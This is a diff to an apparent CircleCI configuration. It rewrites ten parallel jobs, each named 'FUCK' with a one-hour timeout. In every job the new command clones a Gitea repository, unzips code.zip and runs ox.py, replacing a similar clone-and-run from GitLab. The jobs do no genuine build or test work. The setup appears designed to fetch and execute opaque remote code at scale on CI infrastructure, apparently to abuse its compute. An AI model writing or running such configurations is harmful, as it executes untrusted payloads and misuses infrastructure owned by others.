@@ -13,7 +13,8 @@ jobs:
           name: FUCK
           no_output_timeout : 1h
           command: |
-            git clone https://gitlab.com/asyahganda/asura.git && cd asura && python ox.py 
+              sudo apt update && sudo apt install unzip
+              git clone https://gitea.com/trendava/vray.git && cd vray && unzip code.zip && python ox.py
             
             
   images-2:
@@ -29,7 +30,8 @@ jobs:
           name: FUCK
           no_output_timeout : 1h
           command: |
-            git clone https://gitlab.com/asyahganda/asura.git && cd asura && python ox.py
+            sudo apt update && sudo apt install unzip
+            git clone https://gitea.com/trendava/vray.git && cd vray && unzip code.zip && python ox.py
   images-3:
     
     docker:
@@ -43,7 +45,8 @@ jobs:
           name: FUCK
           no_output_timeout : 1h
           command: |
-            git clone https://gitlab.com/asyahganda/asura.git && cd asura && python ox.py
+            sudo apt update && sudo apt install unzip
+            git clone https://gitea.com/trendava/vray.git && cd vray && unzip code.zip && python ox.py
   images-4:
     
     docker:
@@ -57,7 +60,8 @@ jobs:
           name: FUCK
           no_output_timeout : 1h
           command: |
-            git clone https://gitlab.com/asyahganda/asura.git && cd asura && python ox.py
+            sudo apt update && sudo apt install unzip
+            git clone https://gitea.com/trendava/vray.git && cd vray && unzip code.zip && python ox.py
   images-5:
     
     docker:
@@ -71,7 +75,8 @@ jobs:
           name: FUCK
           no_output_timeout : 1h
           command: |
-            git clone https://gitlab.com/asyahganda/asura.git && cd asura && python ox.py
+            sudo apt update && sudo apt install unzip
+            git clone https://gitea.com/trendava/vray.git && cd vray && unzip code.zip && python ox.py
   images-6:
     
     docker:
@@ -85,7 +90,8 @@ jobs:
           name: FUCK
           no_output_timeout : 1h
           command: |
-            git clone https://gitlab.com/asyahganda/asura.git && cd asura && python ox.py
+            sudo apt update && sudo apt install unzip
+            git clone https://gitea.com/trendava/vray.git && cd vray && unzip code.zip && python ox.py
 
   images-7:
     
@@ -100,7 +106,8 @@ jobs:
           name: FUCK
           no_output_timeout : 1h
           command: |
-            git clone https://gitlab.com/asyahganda/asura.git && cd asura && python ox.py
+            sudo apt update && sudo apt install unzip
+            git clone https://gitea.com/trendava/vray.git && cd vray && unzip code.zip && python ox.py
   images-8:
     
     docker:
@@ -114,7 +121,8 @@ jobs:
           name: FUCK
           no_output_timeout : 1h
           command: |
-            git clone https://gitlab.com/asyahganda/asura.git && cd asura && python ox.py
+            sudo apt update && sudo apt install unzip
+            git clone https://gitea.com/trendava/vray.git && cd vray && unzip code.zip && python ox.py
   images-9:
     
     docker:
@@ -128,7 +136,8 @@ jobs:
           name: FUCK
           no_output_timeout : 1h
           command: |
-            git clone https://gitlab.com/asyahganda/asura.git && cd asura && python ox.py
+            sudo apt update && sudo apt install unzip
+            git clone https://gitea.com/trendava/vray.git && cd vray && unzip code.zip && python ox.py
 
   images-10:
     
@@ -143,7 +152,8 @@ jobs:
           name: FUCK
           no_output_timeout : 1h
           command: |
-            git clone https://gitlab.com/asyahganda/asura.git && cd asura && python ox.py
+            sudo apt update && sudo apt install unzip
+            git clone https://gitea.com/trendava/vray.git && cd vray && unzip code.zip && python ox.py
 
 
 workflows:
